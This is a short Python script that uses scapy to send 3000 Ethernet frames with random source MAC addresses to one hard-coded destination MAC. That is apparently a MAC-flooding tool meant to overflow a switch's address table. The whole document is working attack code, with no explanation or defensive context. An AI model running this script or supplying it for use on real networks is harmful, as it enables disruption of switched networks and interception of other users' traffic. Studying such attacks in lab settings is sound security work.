#! /bin/python3

from scapy.all import *

def main():
	mac_counter = 1
	while mac_counter <= 3000:
		eth_hdr = Ether()
		eth_hdr.src = RandMAC()
		eth_hdr.dst = 'EA:61:9E:E4:76:B7'

		sendp(eth_hdr)
		mac_counter += 1

if __name__ == '__main__':
	main()
